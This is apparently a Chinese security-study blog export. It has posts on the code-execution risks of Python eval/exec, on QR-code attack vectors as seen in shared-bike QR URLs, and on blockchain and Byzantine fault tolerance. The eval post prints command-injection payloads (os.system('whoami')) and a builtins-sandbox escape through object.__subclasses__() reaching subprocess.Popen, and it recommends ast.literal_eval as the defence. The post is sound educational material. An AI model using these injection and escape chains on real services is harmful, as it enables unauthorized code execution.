    <url>%2F2019%2F12%2F30%2FFunctions-with-potential-code-execution-risks-in-Python%2F</url>
    <content type="text"><![CDATA[Python中有潜在代码执行风险的函数 参考： Python中有潜在代码执行风险的函数(一) 在Python中一些函数存在着任意代码执行的隐患，错误的使用这些方法将会导致漏洞的产生，攻击者可能会利用这些安全隐患进行攻击。 第一组经典的两个存在执行代码隐患的函数 eval() 和 exec() 在python中，eval和exec 的用法极其相似。eval和exec都可以将传入的字符串执行，但两者又有不同之处 evaleval是一个python内置函数，语法为eval(expression, globals=None,locals=None) eval函数接收三个参数：其中 expression参数是用做运算的字符串类型表达式； globals参数用于指定运行时的全局命名空间； Locals参数用于指定运行时的局部命名空间。 globals与 locals 是可选参数，默认值是 None，他们只在运算时起作用，运算后则销毁。 exec在Python2中exec是一个内置语句(statement)而不是一个函数，但是到了Python3中exec将Python2中作为内置语句的exec和execfile()函数功能整合到一起，成为了一个新的函数，语法为exec(object[, globals[,locals]]) exec的第一个参数可以是code object，因此它可以执行复杂的代码逻辑，例如变量赋值操作等，这一点是eval做不到的。但exec返回值永远为 None，因此exec不能像eval一样将计算结果返回。exec的后两个参数与eval一致。（所以eval通常可以当作是一个计算器，计算一串字符的值） 对比： 在执行python语句上不同 exec()可以对变量a进行赋值，而eval()并不能对a进行赋值 exec()可以执行python的import os，而eval()不能直接执行python语句，但是可以执行表达式&#39;__import__(&quot;os&quot;)&#39;并返回结果 __import__()函数用于动态加载类和函数，可以将该引入模块作为一个动态对象使用 相较于exec： 返回值不同 由图可见，eval在对表达式进行计算后，返回计算结果，而exec并无返回结果 虽然有种种不同，但是还是会将第一个传入参数进行执行 存在的安全隐患以eval()函数为例，下图中的add函数使用eval()对传入参数进行处理，将传入的a，b拼接起来通过eval()计算返回结果 12def add(a, b): return eval("%s + %s" % (a, b)) 通过eval进行执行表达式 123add("__import__('os').system('whoami')", 2)eval("__import__('os').system('whoami')")add("__import__('os').system('whoami') #", 2) 成功执行命令，并返回结果2。 返回结果0是因为os.system()执行成功的话，返回值为0。 如同sql注入一样的思路，在执行语句后面加上注释，即可返回结果0。 防范通过上面可知，只要eval或exec中的传入变量可控，就存在执行系统命令的问题 针对上面的例子eval(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)的问题，存在一种常见的限制方法：即指定eval()或exec()的globals参数为{&#39;builtins&#39;:None}或者{&#39;builtins&#39;:{}}这样的形式就可以避免任意代码执行的隐患。这种方法实际上是限制了他们可用的python内置模块(builtins) 在eval()和exec() ，globals参数用于指定运行时的全局命名空间，如果globals没有被提供，则使用python的全局命名空间 如上图，若不规定globals参数，则使用python全局的a=1，若提供了globals参数{&#39;a&#39;:6}，则使用globals参数里的数据，即eval的作用域就是{&#39;a&#39;:6} 而且当eval使用了自己作用域里的参数，就不会使用python的全局命名空间 python的builtins模块builtins模块是提供对python的所有“内建”标识符的直接访问功能。python解释器在加载时会首先加载内建名称空间并自动导入所对应的内建函数，在执行python的时候加上-v的选择就可以看到加载过程。 python源码分析——内建模块builtins初始化 而且由于builtins的存在，使得在Python可以直接使用一些内建函数而不用显式的导入它们，例如input()、list()、import 等 通过命令dir(__builtins__)就可以看到所有的内建函数 在python中使用上述函数都可以不用导入模块 回到exec/eval问题中，值得注意的是，在exec/eval中，若globals参数被提供，但是没有提供自定义的builtins，那么exec/eval会将当前环境中的builtins拷贝至自己提供的globals里，例子如下图： 如图，若globals里不规定__builtins__，则会使用python全局的builtins，例如in[25]。如果定义了builtins，则会使用已经定义的builtins，如in[27]和in[28]。 这里我没搞懂26为什么也可以，因为builtins在python3.x的时候已经和builtin合并了。 后面实验时发现，builtins可以被当作模块所import，所以推测python初始化的时候使用的是__builtins__，实验证明这是正确的 exec的globals策略与eval相同 因此可以通过指定globals参数，来控制eval运行执行的内置函数。这个方法看起来很有效的限制eval/exec对import等内置函数的使用，似乎可以防止任意代码执行。但是此方法仍然存在绕过 绕过在上述防范中，通过globals参数对builtins中的内置函数范围进行限制，使得eval/exec无法随意使用”import”等内置函数来达成阻止任意代码执行 但是却存在如下绕过：(1, 2).class.bases[0].subclasses 如图，(1,2)是一个元组，__class__用于查看对象所在的类，很显然(1,2)是个元组类型的对象，即tuple类 __bases__属性返回所有直接父类所组成的元组（直接父类是因为python的多继承属性所导致） 如In[36]可见元组类型的直接父类是object类 __subclasses__ 可用来获取类的所有子类，贼恐怖 因为(1,2).__class__.__bases__[0]已经是object类了，而object类的子类众多，因此可以使用的类就非常丰富了 比如list就在object类里，对应着(1,2).__class__.__bases__[0].__subclasses__()[7] 这样就可以调用list函数，将其转为一个list 构造利用链的核心方法就是：只要追溯到object类并使用subclasses()使用object子类即可 在object子类中，有执行系统命令的子类 subprocess.Popen subprocess 模块允许你生成新的进程，连接它们的输入、输出、错误管道，并且获取它们的返回码。 subprocess.Popen(args, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE,stdout=subprocess.PIPE) args被用作启动进程的参数. 可能是一个列表或字符串. shell（默认为 False）指定是否使用 shell 执行程序。如果 shell 为 True，更推荐将 args 作为字符串传递而非序列。 stdout从子进程捕获到的标准输出. 一个字节序列, 或一个字符串, 如果 run() 是设置了 encoding, errors 或者 text=True 来运行的. 如果未有捕获, 则为 None.如果你通过 stderr=subprocess.STDOUT 运行, 标准输入和标准错误将被组合在一起, 并且 stderr` 将为 None. stderr捕获到的子进程的标准错误. 一个字节序列, 或者一个字符串, 如果 run() 是设置了参数 encoding, errors 或者 text=True 运行的. 如果未有捕获, 则为 None. 简而言之上面代码简而言之就是，接受args的命令，执行成功就将执行成功的结果存入stdout管道，执行失败的结果存入stderr管道。 显然，利用链：().__class__.bases[0].__subclasses__()[176](&quot;whoami&quot;) 可能由于我的引入库不同，导致了subclasses的列表选择不同，我在subclasses[217]找到subprocess.Popen，然后成功执行whoami命令 每个python的运行环境不同，引入库的顺序不同，导致subprocess不一定在176位，甚至可能没有被引入 由图可见，虽然可能没被引入，但是这种方法能成功绕过。可见，虽然限制只允许使用list，但是我们仍然可以执行系统命令。因此，简单的使用{‘builtins‘: None}是无法满足eval的安全需求的 实际上，可以使用ast.literal_eval()来代替eval() ast.literal_eval()允许传入的内容如下 strings, bytes, numbers, tuples, lists, dicts, sets, booleans, None 当不合法的字符传入时，程序则会报错，如下图 使用ast.literal_eval()代替eval和exec，可以有效的防止任意代码执行漏洞 甚至只要有任何不合法的字符传入，程序就会报错 使用ast.literal_eval()代替eval和exec，可以有效的防止任意代码执行漏洞 扩展： python沙箱逃逸]]></content>
  </entry>
  <entry>
    <title><![CDATA[QRCodeAttack]]></title>
    <url>%2F2019%2F12%2F30%2FQRCodeAttack%2F</url>
    <content type="text"><![CDATA[关于python的QRCode的用法qrcode的用法 https://blog.csdn.net/cungudafa/article/details/85871871 利用zxing模块读二维码数据 12345678910111213141516171819202122232425262728293031323334from PIL import Imageimport qrcodeimport osimport zxingdef make_qrcode(data): img = qrcode.make(data) img.sava("test.png") im = Image.open("test.png") im.show()def read_qrcode_zxing(filename): ''' logger = logging.getLogger(__name__) if not logger.handlers: logging.basicConfig(level=logging.INFO) DEBUG = (logging.getLevelName(logger.getEffectiveLevel()) == 'DEBUG') ''' img = Image.open(filename) ran = int(random.random() * 100000) img.save('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran)) zx = zxing.BarCodeReader()#调用zxing二维码读取包 data = '' zxdata = zx.decode('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran))#图片解码 # 删除临时文件 os.remove('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran)) if zxdata: logger.debug(u'zxing识别二维码:%s,内容: %s' % (filename, zxdata)) data = zxdata else: logger.error(u'识别zxing二维码出错:%s' % (filename)) img.save('%s-zxing.jpg' % filename) return data 但是，这只能识别标准的二维码，并不能识别图片中的二维码，由于这里需要用到tesseract，因此直接用二维码软件进行扫（注意不能用微信支付宝之类的，因为碰到url此类软件会直接跳转，好像QQ和一些第三方的扫码软件不会直接跳转url，而是显示其数据） 乌云的二维码攻击 QR二维码的攻击方法与防御 网络钓鱼 诱导下载、传播恶意软件 隐私泄露 防御方式 QR码解码译码过程加入加解密环节 第三方统一管理 思考1.加入加解密环节：这只是确保了原二维码的数据的完整性，隐匿性，并不能确保其不被中间人攻击，即直接替换二维码的行为 现有共享单车扫码探索12345678910111213Mobike: 8650262688: http://www.mobike.com/download/app.html?b=8650262688_1 8641170177: http://www.mobike.com/download/app.html?b=8641170177_1 8641176319: http://www.mobike.com/download/app.html?b=8641176319_1 hello bike: 3110469617: http://c3x.me/?n=3110469617 3110457021: http://c3x.me/?n=3110457021 5610663692: http://c3x.me/?n=5610663692 didi bike: https://dc.tt/htw?id=1B24C1D&amp;p=2 https://dc.tt/htw?id=1B4910D&amp;p=2 用电脑直接访问该网址 Mobike是直接跳转到app推荐页面，打开下载，是腾讯合作方的应用宝下载 hello bike也是直接跳转至app推荐页面，打开下载，属于hellobike自己搭建的下载页面 滴滴是跳转到小程序推荐页面， hello 由图可见，明显的一个env变量，推测是用来判断用的。 然后下面就是对enc进行逻辑判断，然后处理跳转 我的浏览器是跳转到了http://c3x.me/bike.html?n=3110469617 https://c3x.me/wechat-ebike.html?n=3110469617是对微信内置浏览器做的一些页面自适应 再次应该是对User-Agent进行判断，并跳转至相应页面，代码如下： 12345// 基本环境及参数 var ua = window.navigator.userAgent; var params = &#123;&#125;; if (location.search) &#123; var parts = location.search.substring(1).split(&apos;&amp;&apos;); 关于window.navigator.userAgent：https://blog.csdn.net/liangyihe/article/details/78464656 以下是苹果的useragent，用去替换 1UserAgent:Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1 果然是同一个页面的不同适应性处理 对于aliBrowser，是对应跳转到相应的下载界面，采用alipays://plat.... 对于哈喽bike App也是跳转到自身的路由，然后再其服务端做处理 Mobike抓包访问，发现是直接301了（永久性转移），然后没找到解决办法 因为是直接跳转至下载界面，所有没有和此单车合作的app都是跳转至下载界面，抓包失败 didi12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849this.config 0 &#123;…&#125;__method__: &quot;POST&quot;_source: &quot;https://page.xiaojukeji.com/m/hellopage.html?id=1B24C1D&amp;p=2&quot;api_version: &quot;1.0.1&quot;app_version: &quot;1.8.7&quot;appid: 30004auto_fill_phone: truecanonical_country_code: &quot;CN&quot;checkPhone: truecity_id: 0country_calling_code: &quot;+86&quot;country_filter: Array []country_id: 156from: &quot;webapp&quot;imei: &quot;&quot;lang: &quot;zh-CN&quot;law_checked: falseorigin_id: &quot;1&quot;role: 1scene: 3showCodeSign: falsestyleObj: Object &#123; &#125;useOauthCode: false&lt;prototype&gt;: Object &#123; … &#125;login.min.js:1:36888 明显的一个post请求，而且采用了https，不好抓包 但是预测是跳转至小程序，属于微信小程序的。 手机抓包工具：fiddler，frida 通过以上可发现，共享单车的二维码大多都是通过二维码的url格式存储，然后通过url访问判断其user-Agent推测出使用的浏览器，然后做不同的路由处理或使用自身协议，如alipays:// 关于密码学与二维码的思考在二维码多存入证书，存储的数据量应该会变大，但是不至于存不下，但是这是没有必要的。 当扫完二维码访问其指向的url时，该请求已向ocsp请求在线证书了；而且该种方法也无法避免中间人攻击。（参考https的ssl中间人攻击） https中的ssl中间人攻击 通过伪造CA证书，实现SSL中间人攻击 SSL,TLS中间人攻击 HTTPS中间人攻击实践（原理·实践） 至于二维码替换更加无可避免，因此还是采用信任可信第三方的(官方app，以及有合作的app)方法比较安全。（因为其用的是路由判断，不存在假的url能跳转） 其次，假如在二维码中加入hash判断，也是不可行的。因为密码学不能依赖于不公开的算法，而且可以通过暴力匹配算出hash算法的流程。因此得知流程，将假url和假url的hash一起替换原url以及其hash便可产生攻击。]]></content>
      <categories>
        <category>QRCode</category>
      </categories>
      <tags>
        <tag>QRCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BlockChain]]></title>
    <url>%2F2019%2F12%2F26%2FBlockChain%2F</url>
    <content type="text"><![CDATA[Bitcoin数字货币和纸质货币的对比 属性 分析 优势方 便携 大部分场景（特别是较大数额支付时）下数字货币将具备更好的便携性 数字货币 防伪 两者各有千秋，但数字货币整体上会略胜一筹。 纸币依靠的是各种设计（纸张、油墨 、防伪 暗纹 、 夹层等）上的精巧，数字货币依靠的则是密码学上的保障。 事实上，纸币的伪造时有发生，但数字货币的伪造目前还无法实现 数字货币 辨伪 纸币即使依托验钞机等专用设备仍会有误判情况，数字货币依靠密码学易于校验 数字货币 匿名 通常情况下，两者都能提供很好的匿名性 。 但都无法防御有意的追踪 持平 交易 对纸币来说，谁持有纸币谁就是合法拥有者，交易通过纸币自身的转移即可完成，无法复制 。 对数字货币来说则复杂得多，因为任何数字物品都是可以被复制的，但数字 形式也意味着转移成本会更低 。 总体上看，两者适用不同的情景 持平 资源 通常情况下，纸币的生产成本要远低于面额。 数字货币消耗资源的计算则复杂得多 。 以比特币为例，最坏情况下可能需要消耗接近甚至超过面值的电能 持平 发行 纸币的发行需要第三方机构的参与，数字货币则通过分布式算法来完成发行。 在人类历史上，通胀和通缩往往是不合理地发行货币造成的，而数字货币尚缺乏大规模验证， 还有待观察 持平 管理 纸币发行和回收往往通过统一机构，易于监管和审计；目前出现的数字货币在这方面 还缺乏足够支持和验证 纸币 双重支付攻击对于数字货币来说，数字化内容容易被复制。数字货币持有人可以将同一份货币发给多个接收者，这种攻击称为“双重支付攻击”。 数字货币1.0：即银行中通过电子账号里面的数字记录了客户的资产 但他依赖于一个前提：假定存在一个安全可靠的第三方记账机构负责记账，这个机构负责所有的担保环节，最终完成交易。 银行、支付宝都属于这种类型。 去中心化的技术难关 货币的防伪：谁负责对货币的真伪进行鉴定 货币的交易：如何确保货币从一方安全转移到另外一方 避免双重支付：如何避免同一份货币支付给多个接收者 数字货币的定义数字货币可以认为是一种基于节点网络和数字加密算法的虚拟货币。数字货币的核心特征主要体现在三个方面： ①由于来自于某些开放的算法，数字货币没有发行主体，因此没有任何人或机构能够控制它的发行； ②由于算法解的数量确定，所以数字货币的总量固定，这从根本上消除了虚拟货币滥发导致的可能； ③由于交易过程需要网络中的各个节点的认可，因此数字货币的交易过程足够安全 。 数字货币是一种不受管制的、数字化的货币，通常由开发者发行和管理，被特定虚拟社区的成员所接受和使用。欧洲银行业管理局将虚拟货币定义为：价值的数字化表示，不由央行或当局发行，也不与法币挂钩，但由于被公众所接受，所以可作为支付手段，也可以电子形式转移、存储或交易 比特币的诞生2008 年 10 月 31 日， 一位化名 Satoshi Nakamoto （中本聪）的人在 metzdowd 密码学邮件列表中提出了比特币（ Bitcoin）的设计白皮书《 Bitcoin: A Peer-to-Peer Electronic Cash System 》，并在2009 年公开了最初的实现代码 。 比特币的意义和价值比特币首次真正从实践意义上实现了安全可靠的去中心化数字货币机制 ，这也是它受到无数金融科技从业者热捧的根本原因 。 作为一种概念货币，比特币主要希望解决已有货币系统面临的几个核心问题： 被掌控在单一机构手中，容易被攻击 自身的价值无法保证，容易出现波动 无法匿名化交易，不够隐私 比特币的生态系统如下： 区块链因比特币而生，但是现在已经脱离了比特币网络自身。 Block Chain区块链本质上是一个去中心化的数据库，又不仅仅是一个数据库。是一串使用密码学方法相关联产生的数据块，每一个数据块中包含了一组比特币网络交易的信息，用于验证其信息的有效性(防伪)和生成下一个区块。 2015年被业界视为区块链元年，2016年则是区块链产业深化发展和全面加速前行的一年，2019年为“上链元年”。 区块链的特点 分布式容错性：分布式网络及其鲁棒，能够容忍部分节点的异常状态 不可篡改性：一致提交后的数据会一直存在，不可销毁和修改 隐私保护性：密码学保证了数据隐私，即便数据泄露也无法解析 随之带来的业务特性 可信任性：区块链技术可以提供天然可信的分布式账本平台，不需要额外的第三方中介机构参与 降低成本：跟传统技术相比，区块链技术可能需要时间、人力和维护成本更少 增强安全：区块链技术将有利于安全、可靠的审计管理和账目清算，减少犯罪风险 所有跟信息、价值、信用等相关的交换过程，都将可能从区块链技术中得到启发或直接受益。 Wikipedia的定义：是借由密码学串接并保护内容的串连文字记录。类比于一种分布式数据库技术，通过维护数据块的链式结构，可以维持持续增长的、不可篡改的数据记录。 区块链技术最早的应用出现在比特币项目中。 基本概念： 交易（transaction）：一次对账本的操作，导致账本状态的一次改变，如添加一条转账记录 区块（block）：记录一段时间内发生的所有交易和状态结果，是对当前账本状态的一次共识 链（chain）：由区块按照发生顺序串联而成，是整个账本状态变化的日志记录 若把区块链作为一个状态机，则每一次交易是视图改变一次状态，而每次共识生成的区块，就是参与者对于区块中交易导致状态的改变的结果进行确认。 在实现上，首先假设存在一个分布式的数据记录账本，这个账本只允许添加 、 不允许删除 。 账本底层的基本结构是一个线性的链表，这也是其名字“区块链”的来源 。 链表由一个个“区块”串联组成，后继区块记录前导区块的哈希值（ pre hash ） 。 新的数据要加入，必须放到一个新的区块中 。 而这个块（以及块里的交易）是否合法，可以通过计算哈希值的方式快速检验出来 。 任意维护节点都可以提议一个新的合法区块，然而必须经过一定的共识机制来对最终选择的区块达成一致。 比特币为例，区块链的共组过程 比特币客户端发起一项交易，广播到比特币网络中并等待确认 。 网络中的节点会将一些收到的等待确认的交易记录打包在一起（此外还要包括前一个区块头部的哈希值等信息），组成一个候选区块 。 试图找到一随机串放到区块里，使得候选区块的哈希结果满足一定条件（比如小于某个值） 。 这个 nonce 串的查找需要一定的时间去进行计算尝试。 一旦节点算出来满足条件的 nonce 串，这个区块在格式上就被认为是“合法”了，就可以尝试在网络中将它广播出去 。 其他节点收到候选区块，进行验证，发现确实符合约定条件了，就承认这个区块是一个合法的新区块，并添加到自己维护的区块链上 。 当大部分节点都将区块添加到自己维护的区块链结构上时，该区块被网络接受，区块中所包括的交易也就得到确认 。 如图，A想要向B发起交易（1，2），做工作量证明，然后将交易广播至区块链网络中（3），让其他节点验证工作量证明（4），验证成功后，将交易区块加入该链的末尾（5），交易成功（6）。 工作量证明Proof of Work：简称PoW，即工作量证明。比特币的这种基于算力寻找 nonce 串的共识机制。 目前，要让哈希结果满足一定条件，并无已知的快速启发式算法，只能进行尝试性的暴力计算 。 尝试的次数越多（工作量越大），算出来的概率越大 。 通过调节对哈希结果的限制，比特币网络控制平均约 10 分钟产生一个合法区块 。 算出区块的节点将得到区块中所有交易的管理费和协议固定发放的奖励费（目前是 12.5 比特币，每四年减半），这个计算新区块的过程俗称为挖矿 。 比特币网络中存在大量（据估计数千个）的维护节点，而且大部分节点都是正常工作的，默认都只承认所看到的最长的链结构 。 只要网络中不存在超过一半的节点提前勾结一起采取恶意行动，则最长的链将很大概率上成为最终合法的链 。 而且随着时间增加，这个概率会越来越大。 例如，经过 6 个区块生成后，即便有一半的节点联合起来想颠覆被的结果，其概率也仅为（1/2)6 = 1.6% ，即低于 1 /60 的可能性 。当然，如果整个网络中大多数的节点都联合起来作恶，可以导致整个系统无法正常工作 。 要做到这一点，往往意味着付出很大的代价，跟通过作恶得到的收益相比，得不偿失 。 区块链的演化 区块链1.0 ​ 区块链1.0是随着比特币的发明而引入，基于用于加密货币 区块链2.0 ​ 主要用于金融服务，在这一阶段引入合同 区块链3.0 ​ 用于金融服务行业之外，同时还包括政府、卫生、媒体、艺术和司法等更综合的行业 Generation X（区块链X） ​ 这是区块链发展过程中一个奇点，有一天我们将会拥有一个公共区块链服务，任何人都可以使用，进而在所有领域提供服务 三种典型演化场景 场景 功能 智能合约 一致性 权限 类型 性能 编程语言 代表 公信的数字货币 记账功能 不带有或较弱 Pow 无 公有链 较低 简单脚本 比特币网络 公信的交易处理 智能合约 图灵完备 PoW、PoS 无 公有链 受限 待定语言 以太坊网络 带权限的分布式账本处理 商业处理 多种语言、图灵完备 包CFT、BFT在内的多种机制、可插拔 支持 联盟链 可扩展 高级编程语言 超级账本 演化出的几种类型： 公有区块链：对公众开放，任何人都可以作为节点参与进来。任何人不会持有该账本，而且向任何参与者开放 私有区块链：仅向特定组织开放，进而确定账本的共享过程 半私有区块链：兼具私有性和公有性，私有部分由某一团体控制，而公有部分则向参与者开放 侧链技术：包括单路楔入式侧链和双路楔入式侧链。针对后者，货币可在主链和侧链间移动，并在必要时返回至主链 许可账本：参与者是已知且受信的，许可账本不需要使用分布式协商一致机制，相反，可以使用一致性协议来维护共享账本 分布式账本：分布式账本分布在参与者之间，并扩散于多个站点或组织中。对应的记录是连续存储的，而不是按情况排序的 共享账本：共享的应用程序和数据库 全私有和专有账本：适用于组织内部的特定私有环境共享数据，并提供数据的真实性保证 标记化区块链：标准的区块链，通过挖掘和初始分布来生成加密货币 无代币区块链：不需在节点间传递值，只需在受信各方之间共享数据 区块链是首个自带对账功能的数字记账技术实现 跟传统的记账技术相比，基于区块链的分布式账本应该包括如下特点： 维护一条不断增长的链，只可能添加记录，而发生过的记录都不可篡改 去中心化，或者说多中心化，无需集中控制而能达成共识，实现上尽量采用分布式 通过密码学的机制来确保交易无法被抵赖和破坏，并尽量保护用户信息和记录的隐私性 分类根据参与者的不同，可以分为公开（public）链、联盟（ consortium）链和私有（private）链。 公有链，顾名思义，任何人都可以参与使用和维护，如比特币区块链，信息是完全公开的； 如果进一步引入许可机制，可以实现私有链和联盟链两种类型： 私有链，由集中管理者进行管理限制，只有内部少数人可以使用，信息不公开； 联盟链则介于两者之间，由若干组织一起合作维护一条区块链，该区块链的使用必须是带有权限的限制访问，相关信息会得到保护，如供应链机构或银行联盟 。 分布式系统与去中心化分布式系统 区块链的核心是一个去中心化的分布式系统 分布式系统中的节点可以相互交换信息 节点分为可信节点、缺陷节点、恶意节点。一个由任意行为的节点被称为拜占庭节点，网络上某个出现任何意外行为的节点都可归类于拜占庭节点。 分布式系统的主要挑战：节点与容错的协调，即一个节点的失效不影响整个系统的运行 同步系统：Synchronous System: Known bounds on times for message transmission, processing , bounds on local clock drifts, etc.(Can use timeout) 异步系统：Asynchronous System: No known bounds on times for message transmission, processing, bounds on local clock drifts, etc.(More realistic, practical, but no timeout.) CAP定理cap定理，又称布鲁尔定理：任意分布式系统不能同时拥有一致性、可用性、分区容错性 一致性(Consistency)：任意节点拥有最新数据副本 可用性(Availablitiy)：系统在使用期间可以被访问，接收请求并在必要时做出响应 分区容错性(Partition Tolerance)：一组节点的失效不影响系统的运行 一般是淘宝的系统可用性可以达到5个9，意思是他的可用水平是99.999%，即全年停机时间不超过(1-0.99999)*365*24*60 = 5.256min CP without A ：一旦发生网络故障或者消息丢失等情况，就要牺牲用户的体验，等待所有数据全部一致了之后再让用户访问系统。分布式存储系统(Redis、Hbase),分布式协调组件Zookeeper. AP wihtout C：要高可用并允许分区，则需放弃一致性。一旦网络问题发生，节点之间可能会失去联系。为了保证高可用，需要在用户访问时可以马上得到返回，则每个节点只能用本地数据提供服务，而这样会导致全局数据的不一致性。 淘宝的购物，12306的买票，都是在可用性和一致性之间舍弃了可用性而选择一致性。保证了最终一致性。 然而区块链可以实现这三种属性 通过复制的方式实现容错性 通过一致性算法确保所有节点具有相同的数据 拜占庭将军问题一群领导拜占庭各部军队的陆军将军，计划从某一城市进攻或撤退。这里，将军们之间的唯一沟通方式是信使，他们需要就同时进攻达成一致意见，以赢得胜利。 问题：一名或多名将军或许是叛徒，可以传达一个误导信息。因此，有必要找到一种可行的机制，让将军们之间达成某种协议，这样就可以同时进行攻击。 相较于分布式系统，将军可视作节点，叛国者则视作拜占庭（恶意的）节点，信使是将军之间沟通的渠道。 拜占庭将军失效所谓拜占庭失效指一方向另一方发送消息，另一方没有收到，或者收到了错误的信息的情形。 在容错的分布式计算中，拜占庭失效可以是分布式系统中算法执行过程中的任意一个错误。这些错误被统称为“崩溃失效”和“发送与遗漏式失效”。当拜占庭失效发生时，系统可能会做出任何不可预料的反应。 这些任意的失效可以粗略地分成以下几类： 进行算法的另一步时失效，即崩溃失效； 无法正确执行算法的一个步骤； 执行了任意一个非算法指定的步骤。 各个步骤由各进程执行，算法就是由这些进程执行的。一个错误的进程是在某个点出现了上述情况的进程。没有出现错误的进程是正确的进程。 拜占庭将军问题——解决算法拜占庭问题的最初描述是：n 个将军被分隔在不同的地方，忠诚的将军希望通过某种协议达成某个命令的一致（比如一起进攻或者一起后退）。但其中一些背叛的将军会通过发送错误的消息阻挠忠诚的将军达成命令上的一致。Lamport 证明了在将军总数大于3m ，背叛者为m 或者更少时，忠诚的将军可以达成命令上的一致。 为了保证上面的需求，必须满足下面两个条件： IC1. 所有忠诚的副官遵守相同的命令，即一致性 IC2. 如果发出命令的将军是忠诚的，那么所有忠诚的副官遵守司令（发出命令的将军）的命令，即正确性 特别提示： 发送命令的每次只有一个将军，将其命令发送给n-1 个副官。 m 代表叛国者的个数，因为将军总数为n，所以副官总数为n-1 个。 IC2 中副官遵守实际上是指忠诚的将军能够正确收到忠诚将军的命令消息。 消息传递 通过消息传递达到一致，如果有m 个叛国将军，则将军们的总数必须为3m+1 个以上。下面是消息传递过程中默认的一些条件： A1. 每个被发送的消息都能够被正确的投递 A2. 信息接收者知道是谁发送的消息 A3. 能够知道缺少的消息 A1 和 A2 假设了两个将军之间通信没有干扰，既不会有背叛者阻碍消息的发送（截断）也不会有背叛者伪造消息的情况（伪造）。即是每个将军都可以无误地将自己的消息发送给其他每个将军。 算法 拜占庭将军问题。口头算法OM(n.m);n=3m+1 OM(m)算法： 12345678910111213141516消息算法OM(m) 。对于所有的非负整数m ，每个发令者通过OM(M) 算法发送命令给n-1 个副官。# 将军通过副官传递消息:即, 消息传递路线: 将军i--Message--&gt;副官i --boardcast--&gt;副官j--Message--&gt;将军j（1）发令者将他的命令发送给每个副官。（2）对于每个i ，vi 是每个副官i 从发令者收到的命令，如果没有收到命令则为撤退命令。副官i 在OM(m-1) 中作为发令者将vi 发送给另外n-2 个副官。（3）对于每个i，并且j 不等于 i，vj 是副官i 从第（2）步中的副官j 发送过来的命令（使用 OM(m-1)算法），如果没有收到第（2）步中的副官j 的命令则默认为撤退命令。最后副官i 使用majority(v1,…,vn-1)得到命令。定义majority(cmd1,cmd2,…,cmdn)等于多数派命令。第一轮将军发给所有副官命令第二轮n-1副官互通将军发了什么,确定将军是否为叛徒,若将军是叛徒，则将军的消息无效,舍弃;将军忠诚,即可在第二轮已可决定第三轮n-1副官互通某个副官各给别人发了什么消息,遍历n-2个副官的消息以判断自己作何决定(例:若L1收到其它L2~L6发来的Vj, 但是他要怀疑准确性，比如L1会想L2发给自己是否是正确的呢？那么就进入第三轮进行投票.因此跟在第2轮之后,L1会依次询问L3,4,5,6 ，问他们上一轮L2给他们发了什么,L1得到第二轮中L2-&gt;L3,L2-&gt;L4,L2-&gt;L5,L2-L6,再结合L2-&gt;L1，从5个里用majority函数决定L2发了啥，再依次遍历L3-6,然后L1完成第二轮的确认) 算法证明详细的算法证明可参考： 拜占庭将军百度百科 如何理解拜占庭将军问题 定理1：对于任意m，如果有超过3m 个将军和最多m 个背叛者，算法OM(m) 满足条件IC1 和条件IC2。 引理1：对于任意m 和k ，如果有超过2k+m 个将军和最多k 个背叛者，那么算法OM(m) 满足IC2 （回顾下IC2 指的是，如果将军是忠诚的，所有的副官遵守将军命令）。 签名消息签名消息在除了满足口头消息A1-A3 三点要求外还应该满足下面A4： A4. （a）签名不可被伪造，一旦被篡改即可发现 （b）任何人都可以验证将军签名的可靠性 choice() 来决定副官的选择： 当集合V 只包含了一个元素v ，那么choice(V)=v ； choice(Φ)=RETREAT。 基于签名消息的算法SM(m)算法： 12345678910初始化Vi=空集合（1）将军签署命令并发给每个副官（2）对于每个副官i ： （A）如果副官i 从发令者收到v:0 的消息，且还没有收到其他命令序列，那么： （i）使Vi 为&#123;v&#125; （ii）发送v:0:i 给其他所有副官 （B）如果副官i 收到消息v:0:j1:...:jk 且v 不在集合Vi 中则 （i）添加v 到Vi （ii）如果k&lt;m ，那么发送v:0:j1:...:jk:i 给每个不在j1,..,jk 中的副官（3）对于每个副官i ，当不再收到消息，则遵守命令choice(Vi) 基于签名消息的算法证明定理2：对于任意m，最多只有m 个背叛者情况下，算法SM(m) 解决拜占庭将军问题。 区块链与分布式系统 区块链的核心是一个点对点的分布式账本，此类账本具有加密安全性，且仅可追加内容，同时不可更改（很难），只有在对等身份成员之间达成共识或协议时才能更新 区块链可以定义为一个平台，在此平台上，对等点可以通过交易交换值，而不需要中央信任仲裁者。 一致性一致性是指不信任节点之间的协议过程。 一致性机制所需满足的需求： 协议：全部可信节点制定同一值 有效性：所有可信节点的商定值必须与至少一个节点所提议的初始值相同 容错性：一致性算法应在能出现故障或恶意节点的情况下运行 完整性：任何节点都不可能做多次决策 一致性机制的类型： 基于拜占庭式的容错：不存在计算密集型操作，依赖于一个简单的、发布签名消息的节点方案 基于领导的一致性机制：节点实现领导选举机制，由获胜节点提供结果值 区块链的一般元素 地址：表示事务中收件人和发件人的唯一标识符，通常表示为公钥或派生自私钥。建议在每个事务中用新生成的地址，防止将交易链接到公共所有者，避免身份识别 事务：区块链的基本单元，表示地址间的值传输 区块：由多个交易和其他元素组成 P2P网络：所有对等点之间的可以彼此通信、发送和接收消息 脚本或程序语言：交易脚本是节点的预定义集合，用于将令牌从一个地址转移到另一个地址，并执行各种其他功能 虚拟机：事务脚本的扩展，可运行图灵完备的代码 状态机：一个区块链可以看作一个状态转换机制 节点：可以生成并验证交易，同时进行挖掘。根据区块链类型及节点分配的角色，还可以执行其他功能 智能合约：智能合约运行于区块链之上，在满足某些条件时封装业务。区块链并不支持智能合约 区块链的特性 分布式一致性：缺少中心信任机制授权的情况下，各方都能达成一致 交易验证：节点发布交易基于预先确定的规则进行验证，有效的交易才能包含在区块中 智能合约平台：区块链定义为一个平台，程序可以运行其上，并代表用户执行业务逻辑 在对等点间传输值：允许通过令牌在用户之间传递值，令牌是值的载体 生成加密货币：是一个可选的特性，为的是激励矿商 